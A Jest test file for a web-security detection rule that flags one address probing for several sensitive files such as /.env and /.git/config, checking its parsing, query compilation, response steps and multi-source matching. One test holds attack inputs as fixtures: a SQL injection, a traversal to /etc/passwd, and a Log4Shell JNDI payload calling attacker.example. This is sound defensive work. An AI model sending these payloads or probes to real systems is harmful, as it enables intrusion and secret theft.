import { describe, expect, test } from "@jest/globals";
import { Statement } from "../../../Server/Utils/AnalyticsDatabase/Statement";
import {
  SECURITY_AUTOMATIC_RESPONSE_LIBRARY_RULES,
  getSecurityAutomaticResponseLibraryEntries,
} from "../../../Server/Utils/SecurityAutomaticResponse/SecurityAutomaticResponseRules";
import SigmaClickhouseCompiler, {
  buildSigmaDistinctCountExpression,
} from "../../../Server/Utils/SecurityEvent/Sigma/SigmaClickhouseCompiler";
import { SecurityAutomaticResponsePolicyKind } from "../../../Types/SecurityAutomaticResponse/SecurityAutomaticResponsePolicy";
import {
  DetectionRuleDataKind,
  isDetectionRuleDataKindSeen,
} from "../../../Types/SecurityEvent/DetectionRuleDataKind";
import {
  DETECTION_RULE_LIBRARY,
  DetectionRuleLibraryCategory,
  DetectionRuleLibraryEntry,
  RECOMMENDED_DETECTION_RULE_IDS,
  SCANNING_FOR_SENSITIVE_FILES_RULE_ID,
  getDetectionRuleLibraryEntry,
} from "../../../Types/SecurityEvent/DetectionRuleLibrary";
import { getDetectionRuleLibraryResponseSteps } from "../../../Types/SecurityEvent/DetectionRuleLibraryResponseSteps";
import { doesDetectionRuleLeaveOutEventsWithNoValue } from "../../../Types/SecurityEvent/DetectionUncountedEvents";
import NormalizedSecurityEvent from "../../../Types/SecurityEvent/NormalizedSecurityEvent";
import { getRealTimeDetectionProblem } from "../../../Types/SecurityEvent/RealTimeDetection";
import SigmaRule from "../../../Types/SecurityEvent/SigmaRule";
import CloudflareNormalizer from "../../../Utils/SecurityEvent/Connectors/CloudflareNormalizer";
import SecurityLogParser from "../../../Utils/SecurityEvent/LogParsers/SecurityLogParser";
import {
  WEB_SENSITIVE_FILE_PATH_ATTRIBUTE,
  WebAttackKind,
} from "../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
import SigmaRuleParser from "../../../Utils/SecurityEvent/Sigma/SigmaRuleParser";
import SigmaRuleSetParser from "../../../Utils/SecurityEvent/Sigma/SigmaRuleSetParser";
import {
  TraceScanSpan,
  buildTraceWebAttackEvent,
} from "../../../Utils/SecurityEvent/TelemetryScan/TraceSignals";
import { readStatementValues } from "../../Helpers/StatementEcho";
import {
  CLOUDFLARE_ZONE,
  MANAGED_RULE_BLOCK,
} from "./Connectors/CloudflareFixtures";
import { logLine } from "./LogParsers/LogParserFixtures";
import { sigmaRuleMatchesEvent } from "./LogParsers/SigmaTestMatcher";

/*
 * THE RULE LIBRARY'S "SCANNING FOR SENSITIVE FILES" (#10745): requests from
 * one address for three or more different well-known sensitive files or
 * admin pages - /.env, /.git/config, /wp-admin - that the site refused or
 * does not have, within five minutes. The Scanners policy acts on it.
 *
 * Here the rule as the library holds it: what it reads, how it counts, the
 * steps it hands a case, that it compiles and runs in real time - and that
 * it reads the same request from an access log, a trace and Cloudflare,
 * and nothing a site serves.
 */

const SCANNER_ADDRESS: string = "198.51.100.23";

function entry(): DetectionRuleLibraryEntry {
  return getDetectionRuleLibraryEntry(SCANNING_FOR_SENSITIVE_FILES_RULE_ID)!;
}

function rule(): SigmaRule {
  return SigmaRuleParser.parse(entry().sigmaRuleYaml);
}

function fromAccessLog(
  target: string,
  status: number,
): Array<NormalizedSecurityEvent> {
  return SecurityLogParser.parse(
    logLine(
      `${SCANNER_ADDRESS} - - [24/Nov/2026:10:45:00 +0000] "GET ${target} HTTP/1.1" ${status} 153 "-" "Mozilla/5.0 zgrab/0.x"`,
    ),
  );
}

function fromTrace(
  url: string,
  status: string,
): NormalizedSecurityEvent | null {
  const span: TraceScanSpan = {
    traceId: "4bf92f3577b34da6a3ce929d0e0e4736",
    spanId: "00f067aa0ba902b7",
    parentSpanId: "",
    sessionId: "",
    name: "GET",
    kind: "SPAN_KIND_SERVER",
    durationMs: 2,
    startTime: new Date("2026-11-24T10:45:00.000Z"),
    serviceId: "0192f1a0-0000-7000-8000-00000000c001",
    serviceType: "OpenTelemetry",
    isLlmSpan: false,
    llmUserMessagePreview: "",
    llmUserId: "",
    llmSystem: "",
    llmRequestModel: "",
    llmOperation: "",
    attributes: {
      "url.full": url,
      "http.request.method": "GET",
      "http.response.status_code": status,
      "network.peer.address": SCANNER_ADDRESS,
    },
  };

  return buildTraceWebAttackEvent(span);
}

describe("Scanning for sensitive files, as the library holds it", () => {
  test("a recommended web rule about web requests, counting three different paths from one address in five minutes", () => {
    const found: DetectionRuleLibraryEntry = entry();

    expect(found.title).toBe("Scanning for sensitive files");
    expect(found.category).toBe(DetectionRuleLibraryCategory.Web);
    expect(found.dataKind).toBe(DetectionRuleDataKind.WebRequests);
    expect(found.groupByField).toBe("principalIp");
    expect(found.distinctCountField).toBe(WEB_SENSITIVE_FILE_PATH_ATTRIBUTE);
    expect(found.matchCountThreshold).toBe(3);
    expect(found.evaluationIntervalInMinutes).toBe(5);
    expect(RECOMMENDED_DETECTION_RULE_IDS).toContain(found.id);
    expect(found.description).toContain(
      "A page your site serves never counts.",
    );

    // Its id is its own, once in the library and once in its YAML.
    expect(
      DETECTION_RULE_LIBRARY.filter(
        (candidate: DetectionRuleLibraryEntry): boolean => {
          return candidate.id === found.id;
        },
      ),
    ).toHaveLength(1);
    expect(found.sigmaRuleYaml).toContain(`id: ${found.id}\n`);
  });

  test("reads only the requests the parsers tag, at medium, as reconnaissance by wordlist (T1595.003)", () => {
    const parsed: SigmaRule = rule();

    expect(parsed.title).toBe(entry().title);
    expect(parsed.level).toBe("medium");
    expect(parsed.mitreTechniques).toContain("T1595.003");
    expect(entry().sigmaRuleYaml).toContain(
      `web.attack.kind: ${WebAttackKind.SensitiveFile}`,
    );
  });

  test("compiles to a read that binds what it looks for, and runs in real time", () => {
    const statement: Statement = SigmaClickhouseCompiler.compile(rule());

    expect(readStatementValues(statement)).toContain(
      WebAttackKind.SensitiveFile,
    );
    expect(statement.query).not.toContain(WebAttackKind.SensitiveFile);
    expect(
      getRealTimeDetectionProblem({
        definition: SigmaRuleSetParser.parse(entry().sigmaRuleYaml),
      }),
    ).toBeNull();
  });

  test("counts each address's different paths, never the requests with no address", () => {
    const distinct: Statement = buildSigmaDistinctCountExpression(
      WEB_SENSITIVE_FILE_PATH_ATTRIBUTE,
    );

    expect(distinct.query).toMatch(/^attributes\[\{p\d+:String\}\]$/);
    expect(readStatementValues(distinct)).toEqual([
      WEB_SENSITIVE_FILE_PATH_ATTRIBUTE,
    ]);
    // An address a Redact rule hid is no one address (#10415).
    expect(doesDetectionRuleLeaveOutEventsWithNoValue(entry())).toBe(true);
  });

  test("hands a case three steps: check what was served, rotate what leaked, keep secrets out of the web root", () => {
    expect(
      getDetectionRuleLibraryResponseSteps(entry().id).map(
        (step: { text: string }): string => {
          return step.text;
        },
      ),
    ).toEqual([
      "Ask your site for each file the address asked for, from outside your network, and check that none of them is served.",
      "If one was served, rotate every secret it holds now: its passwords, keys and tokens.",
      "Keep secrets and repositories out of the folders your web server serves, and have it refuse paths that start with a dot.",
    ]);
  });

  test("the Scanners policy acts on it, and no other policy does", () => {
    expect(
      getSecurityAutomaticResponseLibraryEntries(
        SecurityAutomaticResponsePolicyKind.Scanners,
      ).map((found: DetectionRuleLibraryEntry): string => {
        return found.id;
      }),
    ).toContain(SCANNING_FOR_SENSITIVE_FILES_RULE_ID);

    for (const [kind, ids] of Object.entries(
      SECURITY_AUTOMATIC_RESPONSE_LIBRARY_RULES,
    )) {
      expect({
        kind,
        actsOnIt: ids.includes(SCANNING_FOR_SENSITIVE_FILES_RULE_ID),
      }).toEqual({
        kind,
        actsOnIt: kind === SecurityAutomaticResponsePolicyKind.Scanners,
      });
    }
  });
});

describe("Scanning for sensitive files, over what each source makes of a request", () => {
  test("the same refused request reads the same from an access log, a trace and Cloudflare", () => {
    const events: Array<NormalizedSecurityEvent> = [
      fromAccessLog("/.git/config", 404)[0]!,
      fromTrace("https://shop.example/.git/config", "404")!,
      CloudflareNormalizer.normalize(
        {
          ...MANAGED_RULE_BLOCK,
          source: "firewallCustom",
          description: "Block requests for dotfiles",
          clientRequestPath: "/.git/config",
          clientRequestQuery: "",
          userAgent: "Mozilla/5.0 zgrab/0.x",
        },
        CLOUDFLARE_ZONE,
      ),
    ];

    for (const event of events) {
      expect({
        product: event.productName,
        matches: sigmaRuleMatchesEvent(rule(), event),
        path: event.attributes[WEB_SENSITIVE_FILE_PATH_ATTRIBUTE],
      }).toEqual({
        product: event.productName,
        matches: true,
        path: "/.git",
      });
      // Each is a web request the rule's data kind sees.
      expect(
        isDetectionRuleDataKindSeen(DetectionRuleDataKind.WebRequests, {
          classNames: [event.className],
          vendorNames: [event.vendorName],
          productNames: [event.productName],
        }),
      ).toBe(true);
    }
  });

  test("an injection, a traversal or Log4Shell is its own rule's, never this one's", () => {
    for (const target of [
      "/.env?id=1%27%20or%201%3D1--",
      "/static/../../etc/passwd",
      "/?x=${jndi:ldap://attacker.example/a}",
    ]) {
      for (const event of fromAccessLog(target, 404)) {
        expect({
          target,
          matches: sigmaRuleMatchesEvent(rule(), event),
        }).toEqual({ target, matches: false });
      }
    }
  });

  test("a page the site serves is no event, so there is nothing for it to count", () => {
    for (const target of [
      "/wp-admin/",
      "/wp-login.php",
      "/.well-known/security.txt",
    ]) {
      for (const status of [200, 302, 304]) {
        expect({
          target,
          status,
          events: fromAccessLog(target, status),
        }).toEqual({
          target,
          status,
          events: [],
        });
      }
    }
  });
});
